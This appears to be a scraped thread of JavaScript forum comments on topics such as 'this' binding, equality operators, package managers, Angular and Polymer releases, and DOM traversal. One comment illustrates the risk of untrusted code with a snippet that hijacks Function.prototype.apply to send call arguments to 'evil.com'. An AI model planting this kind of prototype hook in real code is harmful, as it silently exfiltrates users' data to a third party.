I think its because the developers of those frameworks originated from some OOP language like java where you can find a popular pattern named, Publish–subscribe (http://en.wikipedia.org/wiki/Publish%E2%80%93subscribe_pattern). I personally like the addEventListener/removeEventListener .emit names, not only because they sound better to me but I also expect them work as node's EventEmitter. Where as In other's you should carefully read the docs as they might do stuff diffrently. 
I'd argue it's the simplest you can get ;) But each to their own
People hate Javascript for 3 reasons mainly: - They don't understand it, especially ('wtf, no classes? GAAAARBAGE') - They don't consider it hardcore enough - All the hype around it. And based on the first 2 reasons they see the hype as utter bs. And welcome to the happy side!
I've made a personal decision to hold off on diving deeper into js at the moment. I'm in no rush, so I'll wait for the ember2/angular2/react2/js5/6/7 dust cloud to settle. 
I understand it's got shortcomings. But what language doesn't? 
All the languages that people praise because they've never used them in an actual project
Are you sure? Wouldn't the context of the do function be returned and not the context of Chainable? I don't think they're the same since do is not bound. Edit: Oh wait the context is inherited because do is a property of the this object right? I've written my own JS framework and I still forget these sort of edge cases in context sometimes - it's generally more clear to just return self in this case, which is usually what I do just to avoid confusion.
There is still time to register for the MongoDB University class [**M101JS: MongoDB for Node.js Developers**](https://university.mongodb.com/courses/M101JS/about). It's a pretty good class, and it's free.
There should be no confusion. The confusion is created by introducing `self`.
If a function is called as a property of an object, 'this' will be set to that object. var myObject = {}; function whatIsThis() { if ( this === myObject ) { console.log("'this' is myObject"); } else if ( this === window ) { console.log("'this is the global object'"); } else { console.log("'this' is something else"); } } myObject.whatIsThis = whatIsThis; var aDifferentObject = { whatIsThis: whatIsThis } whatIsThis(); // 'this is the global object' myObject.whatIsThis(); // 'this' is myObject myObject["whatIsThis"](); // 'this' is myObject aDifferentObject.whatIsThis(); // 'this' is something else In other words, `this` takes it value based on *how* the function is called, not *where* the function is defined.
Ah, nice job thanks for sharing. Definitely interesting :)
You cannot literally put Javascript in a style sheet, but you can use JS for animating. &gt; Do I make a for loop and have it move to the left one pixel at a time? Basically, yes. I recommend using [jQuery's animate()](http://api.jquery.com/animate/) function which takes care of this process for you.
I just really like how the author is very optimistic about change towards the end.
From my point of view the main pain with javascript is that it gives you too much chance to shoot in your foot for example You should use === instead of ==
You're correct, but if you want to teach how to create a chain able object, I wouldn't want to assume that the person knows closures. 
You can manipulate a style sheet with js; like change the height, width, backgroundColor, color, etc of an element through js, but I don't believe you can run js from within a sytlesheet. To achieve a scroll effect, you could use something like css h1 { display:inline-block; font-size:100px; text-shadow:1px 0 0 red, 0 1px 0 red, -1px 0 0 red, 0 -1px 0 red; position:relative; /*relevant to the animation*/ transition:left 2s linear; /*relevant to the animation*/ } js var h1Style = document.getElementsByTagName("h1")[0].style; var i = 0; setInterval(function() { i += 50; h1Style.left = i + "px"; }, 1000); You could also use js to manipulate the css transform:translate property/value.
I'm interested. What's up?
There's probably something wrong with your RSS syntax. Have you tried validating it? https://validator.w3.org/feed/
What city do you live in? You should try going to your local JS meetup. The one I go to is a good mix of junior and senior people that help each other out.
`"use strict";` won't mess this up. A simple partial application, debounce, or whatever _shouldn't_ be changing context on it. If so, that's a bug in the partial, debounce, etc. implementation. If the function is being called with its context changed, then that's a case of caveat emptor for whoever is changing its context. As in, there had better be a reason for it.
Unfortunately it seems that some keyframe animations don't work in Firefox, even when I replace @-webkit- with @-moz-.
Could you elaborate?
But then again, why would you need "gulp" (even though its great)... when you can just use "npm" and the "scripts" field? "gulp" just needs you to create a "gulp plugin" for all those modules, that already work out of the box on their own. e.g. I can just use "uglify" instead of "gulp-uglify" or "grund-uglify". "npm" can pass params from one "npm task" to another "npm task" and in general work well engouh. 
Carte Blanche! https://www.youtube.com/watch?v=HvSXz7FzjFs
The confusion is always caused by the fact that, in javascript, `this` can refer to a nonlocal object, and you either implicitly rely on `this` working from the correct scope, or you explicitly reference the correct `this` via a different variable. If there was a JS equivalent to python's `self` there would be no confusion.
I don't know; keyframes doesn't seem to work in Firefox, and moz doesn't seem to work either. Most resources are saying I should use moz, but it's not solving the problem.
Without the code, I can't help. Anything telling you to use -moz is outdated.
`==` is not always reliable because it performs type coercion. 0 == false // true 1 == true // true 1 == "1" // true 0 == !1 // true null == false // true null == undefined // true These are really bad. Always use ===
Not advocating it, but CoffeeScript is nice IMO because it gives me some niceties that are missing in JS.
yes but for many cases those problems and headaches don't show up. The point i'm trying to make is that there is no "one true package manger". Bower and NPM are different, and they can do different things better than the other (or possibly others). i like bower because of the simplicity, and because it is opinionated and forces packages which use it to work a certain way. NPM is trying to be everything to everyone. It does a lot of things well (the nested dependencies are a HUGE plus for server-side scripts), but being a simple, no-frills, flat-dependency tree package manager is not one of them. But nobody is forcing you to use either. Use NPM if you want, use bower if you want, use both, or neither! They can coexist just fine and trying to be a "winner" will only make both of them worse. Just like how a raspberry PI isn't "worse" than a Samsung Galaxy S6, they are just different...
Ok, I'll try to find some other solution or some updated resources. 
You can try: [r/sideproject](https://www.reddit.com/r/sideproject) [r/coolgithubprojects](http://www.reddit.com/r/coolgithubprojects) [r/alphaandbetausers](http://www.reddit.com/r/alphaandbetausers) Not sure if you are wanting a code review/critique or beta users/etc but maybe one of these will help.
Fun fact, functions that return an object with methods that can be chained are called monads. Douglas Crockford has a great talk on them called [‘Monads and Gonads’](https://youtu.be/b0EF0VTs9Dc)
I absolutely agree that readable code with a few comments is sometimes a better documentation than any RFC. However, I disagree that there's no need for native solutions for any language; the reasons could be security, performance, the need to work on lower levels of a protocol or simply the fact that there can't be a meaningful standard if there is but one implementation (see WebSQL). But still, it is awesome that we can do so much stuff in JS on so many platforms.
I say yes.
This is very underwhelming. I was expecting a brand new router and a full-fledged i18n support ("first class internationalization" in their own December words), but it's all bug fixes and small hygiene improvements. Not sure if it was worth releasing as a "major" version. Good job by the Angular team, but this is worrying me for the future of angular 1.x, when you compare that release with all the work they've put in Angular 2.0.
&gt; The first one attaches a method to the prototype, which means that all new instances of `MyObject` will have that method. And all the old ones as well, don't forget. *Anything* with the `[[Prototype]] ` delegation of `MyObject` will have access to that method, no matter when it was created.
Are you using D3? You could use http://bl.ocks.org then and just put a front page somewhere, e.g. as blackzver suggests.
I actually tried Meteor with React and it is nice, you have some really good talks about it in youtube. The problems comes when you want to use one of the thousands React components already created like https://github.com/enaqx/awesome-react#components which is one of the strengths of React . The majority of them uses npm which doesn't work on the client side in Meteor. The only way-around is use browserify to create a bundle which slows down the development. I hope that soon we will have a proper Meteor solution for that.
ok, in that case I recommend figuring out what solution you want for the server side first, and then keep a manifest of values you want to send to the client, and just send those. The next concerns you'll have is with date/time formats, number formats, and currency... If I were you I would design for those sooner rather than later, because it's very hard to redesign for bugs with any of those later in the game.
Had to give it a try: var test = 12344321; var arr = (""+test).split(''); if(arr.join('') === arr.reverse().join('')){ console.log(test+" is a palindrome"); }else{ console.log(test+" is NOT a palindrome"); } (EDIT: wanted to try to squeeze it to a short piece of code that would still be somewhat readable)
Hey, thanks. I tried the code that you suggest above before I posted here but the code was failing. It turns out that the Node type for ancorNode and focusNode is Text, not Element. Thanks for the info on Node Types ... this helps me refine my understanding of how the DOM is used in browsers and how to adjust my code logic properly.
Yeah, those anchor/focus nodes are part of the Selection mechanic. So I think what I need to do is to walk up the Node tree using parent until I hit an Element that has the class attribute that I'm looking for. That will be the HTML object that I named with the "id" that I'm trying to act on in my application logic. I didn't realize how fine grained the DOM tree is. I had the idea that Nodes would just be all the tags in a document but no, it's much more subcomponenty than that.
Worth what? It's free and should take no more than a few days to go through. It teaches you the very basics but it's not going to prepare you for any real-world project. It's also the first place I started with JS and now I write JS for a living.
Lucky for me, I've been taking notes! As I said, I really struggle with brain compiling. I'm quite familiar with syntax, since its all very close to Java. Are you familiar with my problem? I've done a bit of googling and it seems its semi common. If so, any free resources you know of to help me? 
[`Element.id`](https://developer.mozilla.org/en-US/docs/Web/API/Element/id) can be used as a shorthand for getting an element's id. You can also set or change an element's id by setting `Element.id` as well. Also, these days you can just use `object instanceof Element` to determine if an object is an element.
&gt;programmation I thought at first this was some library or framework I hadn't heard of, but then I realized it's most likely a mistranslation (your English is good though!) The English term would be *programming.*
Ok, thanks for taking the moment to help with these really basic questions. That's much cleaner.
Impressive! I meant is it worth my time or are there better free alternatives? Also, do you know what I mean by brain compiling? I struggle with that in my other programming stuff. Any free stuff you know of that helped you? Or is it the kind of thing that you just need to keep banging your head at until you understand? 
I don't know about free but I would highly recommend reading JavaScript: The Good Parts, which is &lt;200 pages long, and has basically everything you need to know about vanilla JavaScript. It should be perfect for your level. Otherwise, do what you've been doing. Take notes. Make yourself a cheatsheet/reference sheet, and most importantly: build. Build build build. Make a few small projects or add functionality of some websites or whatever it is that you want to do. The more you do, the quicker you will be done with your "brain compiling" problem, if I understood it correctly.
All coffeescript gives you is another level of indirection. 
Using `nodeType` and `instanceof` are very solid suggestions (and probably how I'd do it), especially for an API like this which is well-documented. However, not all API's will be this easy to use, and sometimes you just want more options when working with the code. So, you could also do something like this: if (element.getAttribute) { id = element.getAttribute('id'); } And if you wanted to be extra defensive: if (element.getAttribute &amp;&amp; typeof element.getAttribute === 'function') { id = element.getAttribute('id'); } Though for this example, it'd be _extremely_ odd to find a `getAttribute` property that was non-native. edit: and props for a very well presented question; I wish all questions here could be this well-prepared!
&gt; There are only two kinds of languages: the ones people complain about and the ones nobody uses. --Bjarne Stroustrup
&gt; NPM forces to use CommonJS modules Not true. Quoting from npm Blog: "npm would like to be the package manager for JavaScript, so if it’s JavaScript related, the npm registry is a good place to put it. Node.js provides a CommonJS-esque module environment, but npm has no feelings on the matter." (http://blog.npmjs.org/post/101775448305/npm-and-front-end-packaging) Personally I expect more and more ES6 modules to emerge in npm. This will take a while, probably at least until ES6 spec is published and node.js starts to support ES6 without any extra flags. But its already starting to happen: http://mammal.io/articles/using-es6-today/ &gt; Browserify is fine, but ... It is a workaround, not a solution. I agree on this point. It is a necessary workaround in the path towards truly modular JavaScript. Browserify may not be perfect, but its the first baby step toward the right direction. Webpack may be the second step. And more steps like ES6 modules, CSS locals, npm 3 will follow. &gt; It would be nice to read a more balanced view about how we should manage dependencies and see some discussion, rather than "abandon Bower because it is bad and use NPM because it is good". My apologies for the directness on the topic. Its probably true that simply ditching Bower may not be feasibile in all cases, but that wasn't my point either. The point I'm trying to give is that switching from Bower to say browserify+npm is usually easier than you would think. Probably a softer migration path in general would be to replace bower-specific package management with npm (while still preserving Bower as it stands). There are some good reads about this in the Bower's issue tracker. See: https://github.com/bower/bower/issues/1520 and https://github.com/bower/bower/issues/1626
Don't sweat it! You're perfectly understandable, which is why it didn't occur to me at first that it wasn't your first language.
Thanks much.
There's no future for angular 1.x 
It says in the release notes that 1.5 will include the router.
Great talk today, Simon! 
If the developer wants to change the context in which this function is called then it should be their choice to do so.
There are differences though, and syntactic sugar is always good when it's standard. 
rEtUrN dA oBjEcT fRoM dA fUnCtIoN MyObJeCt.pRoToTyPe.sHoW = fUnCtIoN() { // sHoW iT hERe rEtUrN tHiS; }; // :) yOu CaN dO iT eQuAlLy WeLl iF tHe FuNcTiOn iS dEfInEd oN tHe ObJeCt iTsElF... // tHiS iS aLsO gOoD :) MyObJeCt.sHoW = FuNcTiOn() { // ShOw iT hERe ReTuRn ThIs; }; hOpE tHiS hElPs.. pLeAsE uPvOtE aNd SuBsCrIbE
Really excited for that new parser. 
2.x to 2.x+0.1 upgrades will be a lot less of a pain in the butt if you use TS or Dart. The tooling will generally be able to spot all breaking changes which affect your codebase. You won't even have to run it to be told which parts need some attention.
 &lt;script type="text/javascript" language="javascript"&gt; jQuery('body').wrapInner('&lt;marquee scrollamount="&lt;?= $object-&gt;amount?&gt;"&gt;&lt;/marquee&gt;'); &lt;/script&gt;
I don't see you using assembly for everything.
So I used a recursive function to find my parent elements. It ended up being pretty simple: function find_parent_article(currentNode) { if (!currentNode) return null; if (currentNode.classList &amp;&amp; currentNode.classList.contains("Article")) { return currentNode; } else { return(find_parent_article(currentNode.parentElement)); } } This function walks up the DOM tree (using parentElement) until it finds an element of class Article that is the container for my text contents. 
Make sure that the expressions you are using in your `if` statement actually evaluate to what you are expecting (`console.log` them to verify they are what you are expecting). And then I'd also recommend using the `.indexOf` method to check that the text box _contains_ the correct answer instead of being _exactly equal to_ the correct answer. This will ensure accidental spaces after words do not make the answer wrong when the word before the spaces is correct.
If you click on the thing that says second image near the top it'll bring you to the problem that I'm talking about.
This is the example we did in class, how would I change this to fit my needs for the program's I'm struggling with? &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8" /&gt; &lt;title&gt;Table&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Table&lt;/h1&gt; &lt;table border="5" width="30%"&gt; &lt;caption&gt;Numbers and Squares&lt;/caption&gt; &lt;!-- 3 cols, 4 rows --&gt; &lt;tr&gt; &lt;th&gt;Number&lt;/th&gt; &lt;!-- "table heading" --&gt; &lt;th&gt;Square&lt;/th&gt; &lt;/tr&gt; &lt;script&gt; var lower_limit = parseInt(prompt("Where do we start?", "1")); var upper_limit = parseInt(prompt("Where do we end?", "10")); for(var num = lower_limit; num &lt;=upper_limit; ++num) { var sqr = num*num; document.write("&lt;tr&gt;"); document.write("&lt;td&gt;"+num+"&lt;/td&gt;"); document.write("&lt;td&gt;"+sqr+"&lt;/td&gt;"); document.write("&lt;/tr&gt;"); } &lt;/script&gt; &lt;/table&gt; &lt;p&gt;The end of table.&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; 
We've learned all of that stuff, so I mean it's hard to explain exactly what I'm struggling with as up to this point I've been able to figure everything out fairly easily. I just can't seem to figure out how to implement my equation into the examples we were given in class. 
for anyone wondering where the name came from https://en.wikipedia.org/wiki/J%C3%A1ra_Cimrman
In your example below the equation is `num*num`. Put your equation there. Did it work? If not, what errors are you getting? When you see these errors do they indicate more work needs to be done? What work is it?
I know. I'm thrilled about how it works. 
But wait, some random guy on Medium told me I shouldn't use Angular!
Hm, if some ES7 feature can be achievedlk in ES6 and ES6 can be transpiled (hate this word but whatever) to ES5 doesn't that actually mean that some ES7 feature can be implemented in ES5?
try using .value instead of .valueOf
Do I do everything else normally and just wrap all the shit inside that return function() {} -statement? Like this: function chainable(fn) { return function () { fn.apply(this, arguments); //all my stuff here return this; }; }
Anyone help me with this stack question? I Really have no idea what I'm doing. Just want to see if it's possible. https://stackoverflow.com/questions/30498754/understanding-classes-in-es6-compose-a-triangle-from-extending-3-points
I was quite surprised to see this. Is there some backstory for this choice of name?
No. `fn` is supposed to be "all the shit"...
That looks interesting, indeed! Thanks for the tip. The site and demo videos leave me with a lot of questions, though. How does it deal with delays like Ajax requests and animations? Do you need to explicitly add waitFor() statements (which makes tests slow and brittle) or does it handle them automatically? How closely does it mimic actual user behavior? Will it scroll elements into view before interacting with them? Will it (try to) click hidden elements or elements that are covered by other elements? How can you run tests from the command line?
I don't want to sound rude, but what's the point if babel already supports async/await ? http://kangax.github.io/compat-table/es7/
It's still classes.
While pretty impossible to visualize all at once. You could do them individually in a line graph using charts.js http://zqp.me/charts/line.html
@undershirt's comment lead to Thinkful, https://www.thinkful.com I'd never heard of these, but looking at Thinkful, and having a problem similar to your's - I'm going to serious look into this
Technically yes (which ultimately is what is happening), but not with the same syntax, since the transpiling step will take the new, currently incompatible sytnax and convert it into something suitable for ES5. And what's suitable for ES5, especially in the case for await, is far more complex because of how these code blocks are ultimately broken up into different executable chunks (functions).
Okay, I'll bite. &gt; If no, why? Inertia. I do web development for a large organization. While I have enough autonomy that I could probably slip Dart into some of my projects, that would be pretty rude to some other person who might have to maintain my code at a later date, because I'd be forcing them to learn a new language when I could have just used one they already know (javascript). I was somewhat more adventurous ten years ago, but in the intervening time, I've learned that you make a lot more friends by being part of the team than by striking out on your own. Mind you, I don't have a problem advocating for new tech, but there has to be a very good reason for it; expecting everyone to re-train just because I found something slightly better than something that already works perfectly well is unrealistic, and it seems unlikely that we'd gain back the hours it would take for people to pick up a new language any time soon. I'd love to learn Dart in my spare time, but I have 2 kids under 2 years old, so I don't *have* spare time (at least not the sort of time when I can sit in front of a computer and really concentrate on something for any length of time), and probably won't for at least another 4 or 5 years. So yeah, that's why I'm not learning Dart, even though I can readily accept that I might like it if I did. All that being said, I do like to at least *know* about new technologies. What is it about Dart that makes debugging awesome? Debugging Javascript is already pretty simple.
For example: function chainable(fn) { return function () { fn.apply(this, arguments); return this; }; } var f1 = function(x) { console.log('-:-', x) }; var f2 = function(x) { console.log(':-:', x) }; var Chain = function() { this.abc = chainable(f1); this.xyz = chainable(f2); } var c = new Chain() c.abc(1).xyz(2).abc(3) // Output: // -:- 1 // :-: 2 // -:- 3
No, thanks. I will not **always** use === because **you** think that == is bad.
&gt; I enjoyed writing code in Dart and I really liked working with Futures. Lots of advanced means to handle concurrency and asynchronisity in JavaScript: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise http://jakearchibald.com/2014/es7-async-functions/ https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Iterators_and_Generators Can be used today with the help of some libraries http://taskjs.org/
Why do I have you tagged as "Some dick"?
Don't know. Ask yourself.
tl;dr When creating a map, use Object.create(null) to avoid running the prototype chain. [Object.define properties()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperties) allows access to some additional object dials and knobs you should probably avoid turning in the name of maintainable code. 
**My observation**: Any language with unsealed global classes is vulnerable to exploits. As long as any module, anywhere, can overwrite methods in global entities (be they classes, modules, prototypes, whatever), every piece of code you write is dependent upon the promise that every other piece of code is well-behaved.
Calling this an attack is a stretch to say the least, this article could be boiled down to "don't include malicious code in your app", and applies to every programming language ever.
`==` is sometimes bad, while `===` is never bad. The idea is to lower the risk profile and accidents in the code. Perhaps, though, you like to live on the wild side.
Very cool.
Both Chrome and Firefox's dev console will show the JSON as an object in the network tab. I like FireBug's method the best, though.
Thanks a lot!
It sounds awesome. Good job, I hope it really takes off.
You have several vastly used libraries to do that: * Q.spawn (Q is used in Angular) https://github.com/kriskowal/q/wiki/API-Reference#qspawngeneratorfunction * Co https://github.com/tj/co Also, what's the point of calling it ES7 if you're still using 'yield' statements? The point of 'async' is to use 'await' statements. 
&gt;**How much does Cypress cost?** &gt;It's free while in beta. This leaves me with... Somewhat mixed feelings. Paid JS frameworks just feel *wrong*, somehow. It looks really good, though. I'd definitely look at donating, probably even contributing static definitions for Typescript if they weren't already available, but I guess this is targeted at another development demographic.
Yeah, I read the article and posted a similar comment before coming here. A great example of "MS07-052: Code execution results in code execution." http://blogs.msdn.com/b/oldnewthing/archive/2007/08/07/4268706.aspx
Yes, let me clarify a few things... This is not a JS framework. It has "framework" like building blocks, because it's highly customizable, but it shares no other features to JS frameworks. In fact, Cypress is actually a desktop application you have to download outside of any package manager. However, while you use Cypress you work in your browser at all times. There are a **considerable** amount of services working through this desktop app and communicating with our web servers to make this all work. This is literally the **only** way to exceed the testing tools already available, and it has taken a considerable amount of time to develop. Not to mention, there is cost involved in this. SauceLabs and Browserstack are vendors which cost money for the same reason. We have our own cross-browser module which means we are spinning up servers constantly. These aren't free. Now that doesn't rule out in the future we may develop "lite" versions, but initially to reduce support costs and needs, Cypress will be paid-only. We are working hand-in-hand with early adopters to ensure the costs are minimal, and sustainable for different company sizes, team sizes, etc. At the end of the day, it will most likely fall in line with other SaaS providers with cost structures you're already familiar with. Cypress is targeting commercial development shops because that is our value proposition. It enables you (the developer) to greatly improve your productivity when writing and debugging tests. Better, faster test coverage improves the quality of your software which has an immediate impact on the value you deliver each and every day.
It doesn't matter. It's a project for a entry level Digital Arts Class. We aren't even supposed to use scripts. HTML is a little boring so my partner and I decided to make it a little interesting. I'm not sure its even running the script. Every time I try to run it in visual studios, it gives me an error HTTP 403.14, when i open the .html files in Chrome it works, but the result is a flash of white, the screen reloads, and the text is gone. 
Thanks for the help. This is my first experience with JS, and I had no instruction, just basic HTML and I looked at example code for scripts and made a lot of educated guesses. Can you explain the console.log to me? how can that verify the if statement is running? what does console.log do? AND Would the line look like this if (form1.elements["one"].indexOf == "art" &amp;&amp; form1.elements["two"].indexOf == "without" &amp;&amp; ..... .... .....) { code to open winPage.html; }
&gt; This makes scrolling impractical. However, when you review the commands that previously ran, the associated element is scrolled into view to help with debugging. This could be pretty useful.
-- Knock knock... -- Who's there? -- GeoCities
I agree with the other commenters, untrusted code is a big no-no: var apply = Function.prototype.apply; Function.prototype.apply = function(ctx, args) { Function.prototype.apply = apply; ajax('evil.com', [].slice.call(arguments)); return this.call(ctx, args[0], args[1], args[2]) }; Try `Object.freeze(Function.prototype)` and see what that does for your performance EDIT `Object.freeze(Function.prototype)` wrecks all kind of havoc on Chrome
Yeah I'm super new to this OOP. His "is a" is helpful as a rule. Thanks for your help
Goes well with [this](http://rainbow.arch.scriptmania.com/scripts/mouse_clock3.html)
wow
Okay thanks for the info. I don't know if you're familiar with phantomjs but if I use page.open while this is happening will this cause the function to be in a infinite loop?
looking at the github for phantomjs theres a few issues of bad html causing an infinite loop because of the prerender() function... so yea ;/
tl;dr an attacker can modify global functions, like `Array.prototype.concat` And of course they can, that's been one of the biggest talking points in JavaScript since the language was created. JavaScript is built on the assumption that code run in your environment is trusted; untrusted code would have a thousand vectors of attack, of which this is one of the less worrisome. If you must run untrusted code, stick it in an iframe or web worker.
You talk about ES6 but fail to mention SystemJS which is built around the ES6 loader. Also you fail to mention with RequireJS you can format your modules like this: define(function(require) { let Class1 = require('file1'), Class2 = require('file2'); let obj = new Class1(), obj2 = new Class2(); return obj.foo(obj2); }); 
Null means "assigned to no value", while undefined means "not defined, not assigned to any value". There's a fundamental difference. There are infinite resources online one can be informed of the differences in how null and undefined are handled by Javascript and their purpose. http://stackoverflow.com/questions/5076944/what-is-the-difference-between-null-and-undefined-in-javascript The answers to this SO question achieve it quite well. Quoted parts: &gt; The undefined value is a primitive value used when a variable has not been assigned a value. The null value is a primitive value that represents the null, empty, or non-existent reference. -- &gt; Quote from the book Professional JS For Web Developers (Wrox): "You may wonder why the typeof operator returns 'object' for a value that is null. This was actually an error in the original JavaScript implementation that was then copied in ECMAScript. Today, it is rationalized that null is considered a placeholder for an object, even though, technically, it is a primitive value." – Diego Deberdt MDN specifies typeof null === 'object' as a bug https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/null Almost every online resource/book can confim that typeof null === 'object' is a bug in the original Javascript implementation and not indented. 
You can watch the state of all post es6 (yeah.. es2015..) here: https://github.com/tc39/ecma262 You can read up what each stage means here: https://docs.google.com/document/d/1QbEE0BsO4lvl7NFTn5WXWeiEIBfaVUF7Dk0hpPpPDzU/edit
I like: https://www.jsoneditoronline.org/ It's open source and can be embedded in your app: https://github.com/josdejong/jsoneditor/
I'm content with JavaScript/Node.js and playing with Go occasionally on the side, as it seems to be the most promising future language. I think Google making Angular 2.0 architectural/design decisions to support both JavaScript and Dart unnecessarily hinders the framework due to the differences between them/limitations of Dart. 
&gt; This is literally the only way to exceed the testing tools already available, and it has taken a considerable amount of time to develop. --&gt;Er... what? Perhaps only because you chose to make it a desktop application... instead of frameworks you can (and we do) run inside of karma+jasmine to get very similar functionality... and free. And often integrated with your favorite IDE, not another standalone app. Unless all you're trying to sell us is the test runner? Which is nice, but... ultimately not useful enough to justify me trying to get approval for purchase. I'm not even quite sure I'd grab this for free, considering it's a standalone app. Maybe if you had webstorm or VS integration... even then, not really sure the advantage.
And?
Yea I completely agree with you - much of CS becomes obsolete with ES6. I still find myself enjoying the little things in CS though, like the ? operator, @ for this, and :: to reference the prototype.
Does angular 2 tie into Polymer at all? 
Same as it does with everything else. Polymer is a library for creating Web Components and Web Components can be used with any current MV\* framework. So, if you create some Web Components with Polymer, Mozilla's X-tag, or without any of those libraries, you'll be able to use them with Angular, React, Ember, or whatever. Web Components basically let you create your own elements and, as far as those frameworks are concerned, those elements are the same as the built-in stuff. You just stick them into the DOM and they do their thing. This works because the life cycle is handled by the browser. When an element is created, its "created" method is invoked, which allows you to register event handlers and do whatever else you have to do to make your Custom Element work.
My god its full of stars
Without digging into the code I am guessing they are considering a touch device scroll gesture as a click event. 
The OP needs some [sugar](http://requirejs.org/docs/whyamd.html#sugar)
Cool, I'll definitely keep an eye on this. Thanks for posting!
To make it more interactive, try to post it to JSBin first. Or post the whole code somewhere so that we could see it or copy it to test with.
I like what they did on the material elements as a shop and add to cart to download. I dig this and will look forward to play around with it, hopefully now the as it hit 1.0 they won't change the way the framework is designed.
Looks like a few of us noticed... https://github.com/Polymer/polymer/issues/1650
Except that with most pubsub systems everything is decoupled. Object A doesn't need a reference to object B in order to listen for events.
Community preferred seems a bit strong to me. "Preferred by people who know about it" is definitely true. But I don't think there's high awareness around it. I don't usually see guides/articles that use AMD using that format (though I hardly ever see guides or articles using AMD at all anymore anyway). Anyway, all your points are well taken. I've added updates to the post covering both of your points. I appreciate the feedback 
Good idea, i'll do it now
http://youtu.be/FsqJFIJ5lLs
&gt; What you're mainly referring to are unit tests, not integration tests. It's quite simple to write &amp; run integration tests, actually. jasmine-jquery to test the DOM. Sinon to stub ajax. I'm even writing a functional library (specific to our app) that lets QA write their own functional tests. &gt; How could you possibly debug IE9 inside of your IDE? Webstorm, PhantomJS running IE... ? Some pretty magical shit out there these days.
But can you get and set elements with [] like you can with a plain object?
Angular doesn't follow semver. Version 1.4 does have breaking changes.
http://triflejs.org/ even.
Right I was using it with Babel. I am assuming they are not going take stuff out of babel once its in there.
A quick fix for the floor is to counter the gravity, on line 183: speler.vy = -F; And for the wall, something like: if (hit wall on left) then (move one "step" to the right)
bump
The script needs to stop correctly after rolling 3 identical pairs in a row and there hs to be a message on the web page that identifies the pair and how many rolls were required to get the three in a row
But what *is* it?
What was the point of naming the categories after elements? The categories are meaningless without a description. Seriously, who the fuck signed off on that. 
home page: &gt;For Modern Browsers &gt;Polymer is built from the ground up for modern browsers, using the latest web platform APIs. Polyfills provide support on evergreen browsers for APIs that aren't universal yet.
Why can't they be open source? It says "1 month free" ... so no, not fully open source.
How long do the shims take to load on Safari and Firefox? Last time I tried using polymer for full modern layout, I was waiting a full second for the shims to load and bootstrap the elements on Firefox and Safari.
So are you saying that the XML nodeName matches a DOM #id, and you just want to copy textContent between nodes? You could do something like this, var recordFields, recordField, i; recordFields = xmlDoc.querySelectorAll("record &gt; *"); for(i = 0; i &lt; recordFields.length; i++){ recordField = recordFields[i]; document.getElementById(recordField.nodeName).textContent = recordField.textContent; } (untested code) You can use jQuery on XMLDocuments to select nodes just like HTML, if that's easier. e.g. $("record &gt; *", xmlDoc).each(function(i, field){ $("#" + field.nodeName).text( field.text() ); }); (also untested)
It's crushing my firefox. consistently. This does not seem like it's production ready.
Incredible work
When you minimize window or switch tabs requestAnimationFrame pauses, and it resumes running when you open the tab again. From [MDN](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame): &gt; The callback rate may be reduced to a lower rate when running in background tabs But delta is based on time, so you will have a pretty large bX and bY (either positive or negative). On next tick you check if ball is outside the viewport and reverse direction, but since bX, bY are large movement will be insufficient to move it into the viewport again and in next frame direction will be reversed again. Solution is to: 1) Make sure that delta never exceeds some limit, eg. 60ms (16fps) 2) Don't swap direction if ball is out of bounds, but set it so that balls direction would move it into the viewport eventually or even better is to prevent it from ever leaving the viewport in the first place.
Took me awhile to figure it out, but there's a single sentence that reads: &gt; Polymer leverages web components, a new set of standards designed to provide reusable components for the web. I still don't know what that means. Who set these standards? Their site is definitely not user friendly. They seem to expect everyone to know what Polymer is. 
&gt; As a sample of the performance difference between 0.5 and 1.0, the results from our medium-list benchmark was that Polymer 1.0 was about 3x faster on Chrome and 4x faster on Safari. The benchmark measures time to first paint for an application with a few thousand nested custom elements, with data binding. Promising?
They previously didn't have good titles for them, they had "core" which contained some material design elements and they had "paper" which was THE group for material design elements and after thinking really hard about it they didn't want to make them that absolute. They came up with the element stuff for a few reasons. It was discussed in some Polycast that i'm too lazy to find, but essentially that. They won't make sense to newcomers but they all seem pretty self explanatory after seeing a description for the first time. Fe. Iron. Sturdy. Core set. Md. Material Design. Au. Gold. Ecom. Ne. Neon. Animation &amp; Special FX Pt. Platinum. Offline, Push - niceties that make a premium experience Mo. Molecules. Outside work, generally combinations of the elements.
Oh, you saw that. :-) It was quick. I deleted it because I said I was going to detect when the character would collide on the right. But I changed my mind quickly. LOL. :-) The reason is that if I can detect that the character would collide on one side, it would be almost all the work anyway. I also wanted to say that I could grok your code. You didn't really write the needed collision detection. You need to detect the collision like when you detect when the character goes off the screen and you correct that. But with the collision you need to use the direction pointed at by both vx and vy. Those tell us the direction the character is going so that we can stop the character from crossing into the walls. Positive vx and the character is going right. Negative vx and the character is going left. Then we need to check the blocks around the character so that we know when the character has crossed them and based on the direction they are going we can reset their position to the nearest pixel next to the wall. Say the wall on the right starts at 200px. The character is moving at 50px speed and is at position 190px. The next move would put the character at 190 + 50 = 240px so over the wall. We know the character is going there because of the positive vx. So we limit the character's position to 200px or 199px to place the character within the boundary. Your game has some good variables. It's quite fun and illustrative. But it's not too simple either. :-) I can see how completing everything that is possible on that screen would make it quite fun. To start with, I would first detect the collision of jumping on the walls at the entrance and trying to walk over the walls on the right. Only with those done I'd try to fix any other collision detections further up the screen.
&gt; stable (in Chrome only) ??
&gt; Who set these standards? The usual people involved in browser standards, the W3C, WHATWG, etc. http://www.w3.org/wiki/WebComponents/
&gt; Fe. Iron. Sturdy. Core set. You know, if they have to build a chain of associations to explain it, maybe the name is just bad. Especially since "Sturdy -&gt; Core set" is kind of a stretch.
It also means WebComponents are limited to text to encode all attributes. Something that isn't a problem if your page structure is designed in real code (e.g. React).
I think we do want that, it works well in C#/C++. Get/set are the most common operations so it's good to have brief sytax. But no overloads, so not happening. I think it's going to slow the adoption of proper maps to be honest.
So the rest arent sturdy? :p
